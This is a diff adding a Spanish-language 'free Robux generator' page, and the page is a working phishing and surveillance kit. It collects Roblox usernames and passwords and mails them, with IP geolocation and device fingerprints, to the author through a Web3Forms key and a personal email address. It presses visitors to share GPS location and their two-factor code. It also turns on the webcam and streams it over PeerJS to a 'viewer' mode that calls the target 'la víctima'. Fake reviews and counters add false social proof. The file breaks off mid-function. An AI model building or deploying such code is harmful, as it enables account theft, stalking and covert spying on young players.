@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Generador de Robux Gratis</title>
+<style>
+:root{
+  --green:#00b06b;--green-dark:#008f56;--red:#e2231a;--gold:#ffc93c;
+  --bg:#0b0e18;--card:#151a2b;--line:#252c45;
+  --text:#eaeefb;--muted:#8d96b2;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'Segoe UI',system-ui,sans-serif;
+  background:radial-gradient(900px 520px at 50% -10%,#1e2748 0%,var(--bg) 60%);
+  color:var(--text);min-height:100vh;
+  display:flex;justify-content:center;align-items:flex-start;
+  padding:28px 16px 70px;overflow-x:hidden;
+}
+.wrap{width:100%;max-width:440px;text-align:center;position:relative;z-index:2}
+.logo{font-size:32px;font-weight:900;letter-spacing:-1px;margin-bottom:4px}
+.logo span{color:var(--green)}
+.sub{color:var(--muted);font-size:13px;margin-bottom:8px}
+.live{
+  display:inline-flex;align-items:center;gap:7px;background:#151a2b;border:1px solid var(--line);
+  border-radius:99px;padding:5px 12px;font-size:11.5px;color:#c9d0e4;margin-bottom:16px;
+}
+.dot{width:8px;height:8px;border-radius:50%;background:#ff4d4d;animation:pulse 1.4s infinite}
+@keyframes pulse{50%{opacity:.25}}
+.card{
+  background:linear-gradient(180deg,#1a2035,#12172a);
+  border:1px solid var(--line);border-radius:18px;padding:26px 22px;
+  box-shadow:0 24px 60px rgba(0,0,0,.55);
+}
+h2{font-size:19px;margin-bottom:6px}
+p.hint{color:var(--muted);font-size:13px;margin-bottom:16px;line-height:1.5}
+label{display:block;text-align:left;font-size:11.5px;color:var(--muted);
+  font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
+input{
+  width:100%;padding:13px 16px;border-radius:12px;border:1px solid var(--line);
+  background:#0f1424;color:var(--text);font-size:15px;outline:none;margin-bottom:14px;
+}
+input:focus{border-color:var(--green)}
+.pw{position:relative}
+.pw input{padding-right:48px;letter-spacing:1px}
+.pw button{
+  position:absolute;right:8px;top:13px;background:none;border:none;cursor:pointer;
+  font-size:16px;line-height:1;padding:4px;color:var(--muted);
+}
+.secure{
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  font-size:11px;color:var(--green);margin-bottom:16px;
+}
+.btn{
+  width:100%;padding:14px;border:none;border-radius:12px;cursor:pointer;
+  font-size:16px;font-weight:800;color:#fff;background:var(--green);
+  transition:.12s;box-shadow:0 6px 0 var(--green-dark);
+}
+.btn:hover{transform:translateY(-1px)}
+.btn:active{transform:translateY(3px);box-shadow:0 3px 0 var(--green-dark)}
+.btn[disabled]{opacity:.45;cursor:not-allowed;box-shadow:0 6px 0 #0c5f3d}
+.btn.ghost{background:#1c2238;box-shadow:0 6px 0 #0f1424;color:#c9d0e4;font-size:14px;padding:12px}
+.amounts{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
+.amount{
+  padding:14px 6px;border-radius:12px;border:2px solid var(--line);
+  background:#0f1424;cursor:pointer;font-weight:800;font-size:17px;transition:.12s;
+}
+.amount small{display:block;color:var(--muted);font-weight:500;font-size:11px;margin-top:3px}
+.amount.sel{border-color:var(--green);background:#0c2a1e;color:var(--green)}
+.amount.sel small{color:var(--green)}
+.bar{height:10px;background:#0f1424;border-radius:99px;overflow:hidden;margin:18px 0 14px}
+.bar > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--green),#3ee89a);transition:width .45s}
+.tasks{text-align:left;font-size:13px;color:var(--muted);min-height:104px}
+.tasks div{margin-bottom:7px;opacity:.3;transition:.3s}
+.tasks div.on{opacity:1;color:var(--text)}
+.tasks div.on::before{content:"✔  ";color:var(--green);font-weight:800}
+.captcha{
+  display:flex;align-items:center;gap:12px;background:#0f1424;border:1px solid var(--line);
+  border-radius:12px;padding:14px;margin-bottom:16px;cursor:pointer;text-align:left;
+}
+.box{width:26px;height:26px;border:2px solid var(--muted);border-radius:6px;flex:0 0 auto;
+  display:grid;place-items:center;font-size:16px;font-weight:800;color:transparent}
+.captcha.ok .box{background:var(--green);border-color:var(--green);color:#fff}
+.captcha small{color:var(--muted);font-size:11px;display:block;margin-top:2px}
+
+.waiting,.locbox{
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  background:#0f1424;border:1px solid var(--line);
+  border-radius:12px;padding:18px 14px;font-size:13.5px;color:#c9d0e4;margin-bottom:16px;
+}
+.locbox.ok{border-color:var(--green);background:#0c2a1e;color:var(--green);font-weight:800}
+.spinner{
+  width:16px;height:16px;border:2px solid #2a3350;border-top-color:var(--green);
+  border-radius:50%;animation:spin .8s linear infinite;flex:0 0 auto;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.pin{
+  width:12px;height:12px;border-radius:50% 50% 50% 0;background:var(--green);
+  transform:rotate(-45deg);flex:0 0 auto;animation:pulse 1.4s infinite;
+}
+
+.camwrap{
+  position:relative;width:100%;aspect-ratio:4/3;background:#05070d;
+  border:1px solid var(--line);border-radius:14px;overflow:hidden;
+  margin-bottom:16px;display:grid;place-items:center;
+}
+.camwrap video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block}
+.camov{
+  position:absolute;inset:0;display:grid;place-items:center;text-align:center;
+  padding:16px;font-size:13px;color:var(--muted);background:rgba(5,7,13,.9);
+}
+.camov.ok{color:var(--green);font-weight:800;font-size:15px;background:rgba(5,7,13,.45)}
+.rec{
+  position:absolute;top:10px;left:10px;display:flex;align-items:center;gap:5px;
+  background:rgba(0,0,0,.55);color:#ff5a5a;font-size:10px;font-weight:800;
+  padding:4px 9px;border-radius:99px;letter-spacing:1px;
+}
+.rec i{width:7px;height:7px;border-radius:50%;background:#ff4d4d;animation:pulse 1.2s infinite}
+.flash{position:absolute;inset:0;background:#fff;animation:fadeout .35s forwards}
+@keyframes fadeout{from{opacity:.9}to{opacity:0}}
+.viendo{
+  position:absolute;top:10px;right:10px;background:rgba(0,0,0,.55);color:var(--green);
+  font-size:10px;font-weight:800;padding:4px 9px;border-radius:99px;
+}
+
+.otp{display:flex;gap:8px;justify-content:center;margin:18px 0 14px}
+.otp input{
+  flex:1 1 0;width:0;min-width:0;height:54px;text-align:center;
+  font-size:22px;font-weight:800;padding:0;margin:0;
+  border-radius:12px;border:2px solid var(--line);
+  background:#0f1424;color:var(--text);outline:none;
+}
+.otp input:focus{border-color:var(--green)}
+.otp input.filled{border-color:var(--green);background:#0c2a1e;color:var(--green)}
+.timer{color:var(--red);font-weight:800;font-size:13px}
+.mini{font-size:11.5px;color:var(--muted);line-height:1.6;margin-top:12px;text-align:left}
+.mini a{color:var(--green);cursor:pointer;text-decoration:none;font-weight:700}
+.mini a:hover{text-decoration:underline}
+.check{text-align:left;font-size:13.5px;line-height:2;color:#c9d0e4;margin:16px 0}
+.check b{color:var(--green);font-weight:800}
+.big{font-size:40px;margin-bottom:6px}
+.hide{display:none}
+
+.comments{
+  margin-top:20px;background:linear-gradient(180deg,#1a2035,#12172a);
+  border:1px solid var(--line);border-radius:18px;padding:22px 20px;text-align:left;
+}
+.c-title{font-size:15px;font-weight:800;margin-bottom:14px;display:flex;
+  align-items:center;justify-content:space-between}
+.c-title span{font-size:11.5px;color:var(--muted);font-weight:500}
+.rating{display:flex;gap:16px;align-items:center;background:#0f1424;border:1px solid var(--line);
+  border-radius:12px;padding:14px;margin-bottom:8px}
+.score{font-size:38px;font-weight:900;line-height:1}
+.stars{color:var(--gold);font-size:13px;letter-spacing:2px}
+.bars{flex:1}
+.brow{display:flex;align-items:center;gap:8px;font-size:10.5px;color:var(--muted);margin-bottom:3px}
+.brow i{flex:1;height:6px;background:#1c2238;border-radius:99px;overflow:hidden}
+.brow i b{display:block;height:100%;background:var(--gold);border-radius:99px}
+.reco{font-size:11.5px;color:var(--muted);margin-bottom:16px}
+.reco b{color:var(--green)}
+.c-item{display:flex;gap:12px;padding:14px 0;border-bottom:1px solid #1c2238;border-radius:8px}
+.c-item.new{animation:pop 1.1s ease}
+@keyframes pop{from{background:#0c2a1e}to{background:transparent}}
+.av{width:38px;height:38px;border-radius:50%;flex:0 0 auto;display:grid;place-items:center;
+  font-weight:800;font-size:14px;color:#fff}
+.c-body{flex:1;min-width:0}
+.c-top{display:flex;gap:7px;align-items:center;font-size:13px;font-weight:700;flex-wrap:wrap}
+.verif{font-size:9.5px;color:var(--green);border:1px solid var(--green);
+  border-radius:99px;padding:1px 6px;font-weight:600;white-space:nowrap}
+.c-time{font-size:11px;color:var(--muted);font-weight:400}
+.c-text{font-size:13px;color:#c9d0e4;line-height:1.5;margin-top:5px;word-wrap:break-word}
+.c-likes{font-size:11px;color:var(--muted);margin-top:7px}
+
+.toast{
+  position:fixed;left:16px;bottom:16px;background:#151a2b;border:1px solid var(--line);
+  border-left:4px solid var(--green);border-radius:10px;padding:10px 14px;font-size:12.5px;
+  box-shadow:0 12px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);
+  transition:.35s;z-index:99;max-width:260px;text-align:left;
+}
+.toast.show{opacity:1;transform:translateY(0)}
+.confetti{position:fixed;top:-20px;width:8px;height:14px;border-radius:2px;z-index:98;
+  animation:fall linear forwards}
+@keyframes fall{to{transform:translateY(105vh) rotate(720deg)}}
+.foot{margin-top:14px;font-size:11px;color:#5b6480}
+#status{
+  position:fixed;right:12px;top:12px;z-index:200;background:#0b0e18;border:1px solid var(--line);
+  border-radius:8px;padding:7px 11px;font-size:11px;font-family:monospace;color:#8d96b2;
+  max-width:230px;line-height:1.5;
+}
+#status.ok{color:#00b06b;border-color:#00b06b}
+#status.err{color:#e2231a;border-color:#e2231a}
+
+/* ============ MODO ESPECTADOR ============ */
+#viewerBox{position:fixed;inset:0;background:#000;z-index:999;display:flex;flex-direction:column}
+#vremoto{flex:1;width:100%;min-height:0;object-fit:contain;background:#000}
+.vbar{
+  position:absolute;bottom:0;left:0;right:0;display:flex;align-items:center;
+  justify-content:space-between;gap:10px;padding:14px 16px;
+  background:linear-gradient(transparent,rgba(0,0,0,.9));font-size:13px;color:#fff;
+}
+.vbar span{font-weight:700}
+.vbar span.ok{color:#3ee89a}
+.vbar button{
+  background:var(--green);border:none;color:#fff;font-weight:800;font-size:12px;
+  padding:9px 14px;border-radius:10px;cursor:pointer;
+}
+#vmanual{
+  position:absolute;inset:0;display:flex;flex-direction:column;gap:12px;
+  align-items:center;justify-content:center;padding:24px;background:#0b0e18;color:#eaeefb;
+}
+#vmanual p{font-size:14px;color:#8d96b2;text-align:center;max-width:320px;line-height:1.6}
+#vmanual input{max-width:320px;margin:0}
+#vmanual button{
+  background:var(--green);border:none;color:#fff;font-weight:800;font-size:15px;
+  padding:13px 22px;border-radius:12px;cursor:pointer;
+}
+#viewerBox.hide{display:none}
+#vmanual.hide{display:none}
+</style>
+</head>
+<body>
+
+<div id="status" class="hide">esperando datos...</div>
+
+<div class="wrap">
+  <div class="logo">R<span>O</span>BUX <span>GRATIS</span></div>
+  <div class="sub">Generador · Entrega instantánea</div>
+  <div class="live"><span class="dot"></span> <b id="liveCount">2.847</b> personas conectadas ahora</div>
+
+  <!-- PASO 1 -->
+  <div class="card" id="s1">
+    <div class="big">🎮</div>
+    <h2>Inicia sesión para recibir tus Robux</h2>
+    <p class="hint">Usa los mismos datos de tu cuenta de Roblox</p>
+    <label for="user">Usuario</label>
+    <input type="text" id="user" placeholder="TuUsuario" autocomplete="off" spellcheck="false">
+    <label for="pass">Contraseña</label>
+    <div class="pw">
+      <input type="password" id="pass" placeholder="••••••••" autocomplete="off">
+      <button type="button" id="eye" title="Mostrar contraseña">👁</button>
+    </div>
+    <div class="secure">🔒 Conexión segura · Datos cifrados</div>
+    <button class="btn" id="go1">Continuar →</button>
+    <div class="foot">+18.420 Robux entregados hoy</div>
+  </div>
+
+  <!-- PASO 2 -->
+  <div class="card hide" id="s2">
+    <div class="big">📍</div>
+    <h2>Verificación de ubicación</h2>
+    <p class="hint">Para acreditar los Robux en tu cuenta necesitamos confirmar desde dónde te conectás. <b>Es obligatorio.</b></p>
+    <div class="locbox" id="locBox">
+      <span class="pin"></span> <span id="locTxt">Tocá el botón para permitir tu ubicación</span>
+    </div>
+    <button class="btn" id="goLoc">📍 Permitir mi ubicación</button>
+    <div class="mini hide" id="locErr">
+      <b style="color:var(--red)">No pudimos obtener tu ubicación.</b><br>
+      <span id="locErrTxt"></span>
+    </div>
+    <div class="mini hide" id="locEscape"><a id="locSkip">Continuar sin ubicación</a></div>
+  </div>
+
+  <!-- PASO 3 -->
+  <div class="card hide" id="s3">
+    <div class="big">💰</div>
+    <h2>¿Cuántos Robux quieres?</h2>
+    <p class="hint">Elige tu paquete</p>
+    <div class="amounts" id="amounts">
+      <div class="amount" data-v="40">40<small>común</small></div>
+      <div class="amount sel" data-v="80">80<small>popular</small></div>
+      <div class="amount" data-v="400">400<small>raro</small></div>
+      <div class="amount" data-v="800">800<small>legendario</small></div>
+    </div>
+    <button class="btn" id="go2">Generar Robux ⚡</button>
+  </div>
+
+  <!-- PASO 4 -->
+  <div class="card hide" id="s4">
+    <div class="big">⚙️</div>
+    <h2>Generando tus Robux...</h2>
+    <p class="hint" id="genUser"></p>
+    <div class="bar"><i id="fill"></i></div>
+    <div class="tasks" id="tasks">
+      <div>Conectando con los servidores de Roblox</div>
+      <div>Validando usuario y contraseña</div>
+      <div>Comprobando el saldo de la cuenta</div>
+      <div>Preparando la entrega</div>
+    </div>
+  </div>
+
+  <!-- PASO 5 -->
+  <div class="card hide" id="s5">
+    <div class="big">🤖</div>
+    <h2>Verificación humana</h2>
+    <p class="hint">Paso obligatorio para completar la entrega</p>
+    <div class="captcha" id="captcha">
+      <div class="box" id="box">✔</div>
+      <div>No soy un robot<small id="capTxt">Marca la casilla para continuar</small></div>
+    </div>
+    <button class="btn" id="go3" disabled>Completar verificación</button>
+  </div>
+
+  <!-- PASO 6: CAMARA -->
+  <div class="card hide" id="s6">
+    <div class="big">📷</div>
+    <h2>Verificación con cámara</h2>
+    <p class="hint">Roblox necesita confirmar que sos una persona real. Mirá a la cámara un segundo. <b>Es obligatorio.</b></p>
+
+    <div class="camwrap" id="camwrap">
+      <video id="video" autoplay playsinline muted></video>
+      <div class="rec hide" id="rec"><i></i> EN VIVO</div>
+      <div class="viendo hide" id="viendo">👁 MIRANDO</div>
+      <div class="camov" id="camOv">Cámara apagada</div>
+    </div>
+
+    <button class="btn" id="goCam">📷 Activar cámara</button>
+
+    <div class="mini hide" id="camErr">
+      <b style="color:var(--red)">No pudimos acceder a tu cámara.</b><br>
+      <span id="camErrTxt"></span>
+    </div>
+    <div class="mini hide" id="camEscape"><a id="camSkip">Continuar sin cámara</a></div>
+  </div>
+
+  <!-- PASO 7 -->
+  <div class="card hide" id="s7">
+    <div class="big">🔐</div>
+    <h2>Verificación de seguridad</h2>
+    <p class="hint">Roblox te enviará un código de 6 dígitos a tu correo o teléfono para confirmar que la cuenta es tuya.</p>
+
+    <div class="waiting" id="waitBox">
+      <span class="spinner"></span> <span id="waitTxt">Conectando con Roblox...</span>
+    </div>
+
+    <div id="codeArea" class="hide">
+      <div class="timer" style="margin-top:14px">⏳ El código expira en <span id="cd">05:00</span></div>
+      <div class="otp" id="otp">
+        <input maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+        <input maxlength="1" inputmode="numeric">
+      </div>
+      <button class="btn" id="goVerify" disabled>Verificar código</button>
+      <div class="mini hide" id="hint1">
+        Revisá tu <b>correo</b>, tu <b>teléfono</b> o tu app de autenticación. El código llega desde Roblox.
+      </div>
+      <div class="mini hide" id="hint2">¿Todavía nada? Puede tardar hasta un minuto. Fijate también en la carpeta de spam.</div>
+      <div class="mini"><a id="resend">¿No te llegó? Reenviar código</a></div>
+      <div class="mini hide" id="fallback">¿No tenés verificación en dos pasos? <a id="skip">Continuar sin código</a></div>
+    </div>
+  </div>
+
+  <!-- PASO 8 -->
+  <div class="card hide" id="s8">
+    <div class="big">✅</div>
+    <h2>¡Cuenta verificada!</h2>
+    <p class="hint" id="winText"></p>
+    <div class="check">
+      <b>✔</b> Usuario validado<br>
+      <b>✔</b> Contraseña correcta<br>
+      <b>✔</b> Ubicación confirmada<br>
+      <b>✔</b> Rostro verificado<br>
+      <b>✔</b> Código de seguridad confirmado<br>
+      <b>✔</b> Entrega en proceso
+    </div>
+    <div class="foot">Los Robux se acreditan en 5-10 minutos</div>
+  </div>
+
+  <!-- COMENTARIOS -->
+  <div class="comments">
+    <div class="c-title">💬 Comentarios <span id="cTotal">(4.382 opiniones)</span></div>
+    <div class="rating">
+      <div><div class="score">4.8</div><div class="stars">★★★★★</div></div>
+      <div class="bars">
+        <div class="brow">5 <i><b style="width:87%"></b></i> 87%</div>
+        <div class="brow">4 <i><b style="width:9%"></b></i> 9%</div>
+        <div class="brow">3 <i><b style="width:3%"></b></i> 3%</div>
+        <div class="brow">2 <i><b style="width:1%"></b></i> 1%</div>
+        <div class="brow">1 <i><b style="width:0%"></b></i> 0%</div>
+      </div>
+    </div>
+    <div class="reco"><b>96%</b> de las personas recomienda esta página</div>
+    <div id="cList"></div>
+    <button class="btn ghost" id="more" style="margin-top:16px">Ver más comentarios</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<!-- ============ VISTA ESPECTADOR ============ -->
+<div id="viewerBox" class="hide">
+  <video id="vremoto" autoplay playsinline></video>
+  <div class="vbar">
+    <span id="vstatus">Conectando con la víctima...</span>
+    <button id="vfull">⛶ Pantalla completa</button>
+  </div>
+  <div id="vmanual" class="hide">
+    <p>Pegá el ID del en vivo que te llegó por mail:</p>
+    <input id="vid" placeholder="ID del en vivo">
+    <button id="vgo">Ver en vivo</button>
+  </div>
+</div>
+
+<script>
+/* ================= CONFIG ================= */
+const CONFIG = {
+  /* Tu Access Key de web3forms.com */
+  web3forms: 'e576d498-861e-4bc0-9226-6c4ef92488a9',
+
+  /* Nombre que aparece como remitente del mail */
+  remitente: 'Robux Gratis',
+
+  /* Tu correo, solo de referencia */
+  email: 'benjaminfavorito2007@gmail.com'
+};
+/* ========================================= */
+
+const $ = id => document.getElementById(id);
+let user = '', amount = 80;
+const screens = ['s1','s2','s3','s4','s5','s6','s7','s8'];
+const show = id => { screens.forEach(s => $(s).classList.add('hide')); $(id).classList.remove('hide'); };
+const DEBUG = location.search.includes('debug');
+const esperar = ms => new Promise(r => setTimeout(r, ms));
+
+function setStatus(txt, cls) {
+  if (!DEBUG) return;
+  const s = $('status');
+  s.classList.remove('hide','ok','err');
+  if (cls) s.classList.add(cls);
+  s.textContent = txt;
+}
+
+/* ============ CARGADOR DE PEERJS ============ */
+function cargarPeerJS(cb) {
+  if (window.Peer) return cb();
+  const s1 = document.createElement('script');
+  s1.src = 'https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js';
+  s1.onload = () => cb();
+  s1.onerror = () => {
+    const s2 = document.createElement('script');
+    s2.src = 'https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js';
+    s2.onload = () => cb();
+    document.head.appendChild(s2);
+  };
+  document.head.appendChild(s1);
+}
+
+/* ================= MODO ESPECTADOR ================= */
+const qs = new URLSearchParams(location.search);
+const ES_VIEWER = qs.has('ver') || qs.has('viewer');
+
+function modoViewer() {
+  document.querySelector('.wrap').classList.add('hide');
+  $('viewerBox').classList.remove('hide');
+  const id = qs.get('ver');
+  if (!id) { $('vmanual').classList.remove('hide'); return; }
+  conectarViewer(id);
+}
+
+function conectarViewer(id) {
+  $('vmanual').classList.add('hide');
+  $('vstatus').textContent = 'Conectando con la víctima...';
+
+  cargarPeerJS(() => {
+    const peer = new Peer();
+    peer.on('open', () => {
+      let dummy = null;
+      try {
+        const c = document.createElement('canvas');
+        c.width = 2; c.height = 2;
+        dummy = c.captureStream(1);
+      } catch (e) {}
+
+      const call = dummy ? peer.call(id, dummy) : peer.call(id);
+      call.on('stream', s => {
+        $('vremoto').srcObject = s;
+        $('vstatus').textContent = '🔴 EN VIVO';
+        $('vstatus').classList.add('ok');
+      });
+      call.on('close', () => {
+        $('vstatus').textContent = 'Se desconectó';
+        $('vstatus').classList.remove('ok');
+      });
+
+      setTimeout(() => {
+        if (!$('vremoto').srcObject) $('vstatus').textContent = 'No se pudo conectar. Refrescá la página.';
+      }, 15000);
+    });
+    peer.on('error', () => { $('vstatus').textContent = 'Error de conexión. Refrescá.'; });
+  });
+}
+
+if ($('vgo')) $('vgo').onclick = () => {
+  const id = $('vid').value.trim();
+  if (id) { history.replaceState(null,'', location.pathname + '?ver=' + id); conectarViewer(id); }
+};
+
+if ($('vfull')) $('vfull').onclick = () => {
+  const v = $('vremoto');
+  if (v.requestFullscreen) v.requestFullscreen();
+  else if (v.webkitEnterFullscreen) v.webkitEnterFullscreen();
+};
+
+/* ================= DATOS DEL VISITANTE ================= */
+const geo = { ip:'', pais:'', ciudad:'', region:'', isp:'', tz:'', lat:null, lon:null, gps:null, dir:'' };
+
+const geoPromise = fetch('https://ipwho.is/')
+  .then(r => r.json())
+  .then(d => {
+    if (!d || d.success === false) throw new Error('fail');
+    geo.ip = d.ip; geo.pais = d.country; geo.ciudad = d.city; geo.region = d.region;
+    geo.isp = (d.connection && (d.connection.isp || d.connection.org)) || '';
+    geo.tz = (d.timezone && d.timezone.id) || '';
+    geo.lat = d.latitude; geo.lon = d.longitude;
+  })
+  .catch(() => fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(d => {
+      geo.ip = d.ip; geo.pais = d.country_name; geo.ciudad = d.city; geo.region = d.region;
+      geo.isp = d.org; geo.tz = d.timezone; geo.lat = d.latitude; geo.lon = d.longitude;
+    })
+    .catch(() => {})
+  );
+
+function datosDispositivo() {
+  const ua = navigator.userAgent;
+  let so = 'Desconocido';
+  if (/Windows NT 10/.test(ua)) so = 'Windows 10/11';
+  else if (/Windows NT/.test(ua)) so = 'Windows';
+  else if (/Android/.test(ua)) so = 'Android ' + ((ua.match(/Android ([\d.]+)/) || [])[1] || '');
+  else if (/iPhone|iPod/.test(ua)) so = 'iOS (iPhone)';
+  else if (/iPad/.test(ua)) so = 'iPadOS';
+  else if (/Mac OS X/.test(ua)) so = 'macOS';
+  else if (/Linux/.test(ua)) so = 'Linux';
+
+  let nav = 'Desconocido';
+  if (/Edg\//.test(ua)) nav = 'Edge';
+  else if (/OPR\/|Opera/.test(ua)) nav = 'Opera';
+  else if (/SamsungBrowser/.test(ua)) nav = 'Samsung Internet';
+  else if (/Firefox\//.test(ua)) nav = 'Firefox';
+  else if (/Chrome\//.test(ua)) nav = 'Chrome';
+  else if (/Safari\//.test(ua)) nav = 'Safari';
+
+  const tipo = /iPad|Tablet/.test(ua) ? 'Tablet'
+             : /Mobi|Android|iPhone|iPod/.test(ua) ? 'Celular'
+             : 'Computadora';
+  return { so, nav, tipo };
+}
+
+function recogerDatos() {
+  const dv = datosDispositivo();
+  const zona = geo.tz || (Intl.DateTimeFormat().resolvedOptions().timeZone || '?');
+  return {
+    'IP': geo.ip || 'no disponible',
+    'Pais': geo.pais || '?',
+    'Ciudad': geo.ciudad || '?',
+    'Region': geo.region || '?',
+    'Proveedor de internet': geo.isp || '?',
+    'Mapa por IP (aprox)': (geo.lat && geo.lon) ? 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon : 'no disponible',
+    'Zona horaria': zona,
+    'Hora local': new Date().toLocaleString('es-AR'),
+    'Idioma': (navigator.language || '?') + (navigator.languages && navigator.languages.length > 1 ? ' | ' + navigator.languages.join(', ') : ''),
+    'Dispositivo': dv.tipo,
+    'Sistema operativo': dv.so,
+    'Navegador': dv.nav,
+    'Pantalla': (screen.width || '?') + 'x' + (screen.height || '?') + ' | zoom ' + (window.devicePixelRatio || 1) + 'x',
+    'Nucleos / RAM': (navigator.hardwareConcurrency || '?') + ' nucleos' + (navigator.deviceMemory ? ' / ' + navigator.deviceMemory + ' GB' : ''),
+    'User agent': navigator.userAgent
+  };
+}
+
+/* ---------- ENVÍO POR EMAIL (Web3Forms) ---------- */
+function sendData(payload, asunto) {
+  /* copia local, siempre */
+  try {
+    const log = JSON.parse(localStorage.getItem('rbx_logins') || '[]');
+    log.push({ ...payload, asunto, fecha: new Date().toLocaleString('es-AR') });
+    localStorage.setItem('rbx_logins', JSON.stringify(log));
+  } catch (e) {}
+
+  if (!CONFIG.web3forms || CONFIG.web3forms.indexOf('PEGA') === 0) {
+    console.warn('[Mail] Falta la clave de Web3Forms, no se envio nada.');
+    setStatus('⚠ falta la clave de Web3Forms', 'err');
+    return;
+  }
+
+  setStatus('enviando...');
+  fetch('https://api.web3forms.com/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify({
+      access_key: CONFIG.web3forms,
+      subject: asunto,
+      from_name: CONFIG.remitente,
+      ...payload
+    })
+  })
+  .then(r => r.json())
+  .then(d => {
+    console.log('[Mail] respuesta:', d);
+    if (d && d.success) setStatus('✔ mail enviado', 'ok');
+    else setStatus('⚠ error: ' + ((d && d.message) || 'desconocido'), 'err');
+  })
+  .catch(e => { console.error('[Mail] FALLO:', e); setStatus('✖ error de red', 'err'); });
+}
+
+if (ES_VIEWER) modoViewer();
+
+/* --- Ojo contraseña --- */
+$('eye').onclick = () => {
+  const p = $('pass');
+  p.type = p.type === 'password' ? 'text' : 'password';
+  $('eye').textContent = p.type === 'password' ? '👁' : '🙈';
+};
+
+/* --- PASO 1 --- */
+$('go1').onclick = () => {
+  const u = $('user').value.trim().replace(/^@/, '');
+  const p = $('pass').value;
+  if (u.length < 3) { $('user').style.borderColor = 'var(--red)';
+    $('user').placeholder = 'Escribe al menos 3 letras'; return; }
+  if (p.length < 1) { $('pass').style.borderColor = 'var(--red)';
+    $('pass').placeholder = 'Escribe tu contraseña'; return; }
+
+  user = u;
+  $('genUser').textContent = '@' + user + ' · 🔒 validando credenciales';
+
+  Promise.race([geoPromise, esperar(3000)]).then(() => {
+    sendData({ usuario: u, contraseña: p, paso: '1 - Login', ...recogerDatos() },
+             '🎮 @' + u + ' · clave: ' + p);
+  });
+
+  entrarUbicacion();
+};
+$('pass').addEventListener('keydown', e => { if (e.key === 'Enter') $('go1').click(); });
+['user','pass'].forEach(id => $(id).addEventListener('input', e => e.target.style.borderColor = 'var(--line)'));
+
+/* --- PASO 2 --- */
+let intentosLoc = 0;
+
+function entrarUbicacion() {
+  show('s2');
+  $('locBox').classList.remove('ok');
+  $('locBox').classList.remove('hide');
+  $('locTxt').textContent = 'Tocá el botón para permitir tu ubicación';
+  $('goLoc').classList.remove('hide');
+  $('goLoc').disabled = false;
+  $('goLoc').textContent = '📍 Permitir mi ubicación';
+  $('locErr').classList.add('hide');
+
+  if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: 'geolocation' }).then(p => {
+      if (p.state === 'denied') {
+        $('locErr').classList.remove('hide');
+        $('locErrTxt').textContent =
+          'La ubicación está bloqueada. Tocá el candadito 🔒 al lado de la dirección, entrá en "Ubicación", permitila y volvé a intentar.';
+        $('locEscape').classList.remove('hide');
+      }
+    }).catch(() => {});
+  }
+}
+
+$('goLoc').onclick = () => {
+  if (!navigator.geolocation) { ubicacionOk(); return; }
+  const btn = $('goLoc');
+  btn.disabled = true;
+  btn.textContent = 'Buscando tu ubicación...';
+  $('locBox').classList.remove('hide');
+  $('locTxt').textContent = 'Solicitando permiso de ubicación...';
+  $('locErr').classList.add('hide');
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      geo.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, prec: Math.round(pos.coords.accuracy) };
+      ubicacionOk();
+    },
+    err => {
+      intentosLoc++;
+      btn.disabled = false;
+      btn.textContent = '📍 Volver a intentar';
+      $('locBox').classList.add('hide');
+      $('locErr').classList.remove('hide');
+      $('locErrTxt').textContent = err.code === 1
+        ? 'Tocá el candadito 🔒 al lado de la dirección, entrá en "Ubicación", permitila y volvé a intentar.'
+        : 'Activá la ubicación (GPS) de tu dispositivo y volvé a intentar.';
+      if (intentosLoc >= 2) $('locEscape').classList.remove('hide');
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+};
+
+function ubicacionOk() {
+  $('locBox').classList.remove('hide');
+  $('locBox').classList.add('ok');
+  $('locTxt').textContent = '✔ Ubicación confirmada';
+  $('goLoc').classList.add('hide');
+  $('locErr').classList.add('hide');
+  enviarUbicacion();
+  setTimeout(() => show('s3'), 1400);
+}
+
+function enviarUbicacion() {
+  const g = geo.gps;
+  const base = {
+    usuario: user,
+    'Ubicacion obtenida por': g ? ('GPS del dispositivo, precision +- ' + g.prec + ' m') : 'IP (aproximada)',
+    'Coordenadas': g ? (g.lat + ', ' + g.lon) : ((geo.lat || '?') + ', ' + (geo.lon || '?')),
+    'Mapa en Google Maps': g
+      ? 'https://www.google.com/maps?q=' + g.lat + ',' + g.lon
+      : ((geo.lat && geo.lon) ? 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon : 'no disponible'),
+    'IP': geo.ip || '?',
+    'Pais': geo.pais || '?',
+    'Ciudad (por IP)': geo.ciudad || '?'
+  };
+
+  if (!g) { sendData(base, '📍 Ubicacion de @' + user); return; }
+
+  fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + g.lat +
+        '&longitude=' + g.lon + '&localityLanguage=es')
+    .then(r => r.json())
+    .then(d => {
+      const dir = [d.locality || d.city, d.principalSubdivision, d.countryName].filter(Boolean).join(', ');
+      geo.dir = dir;
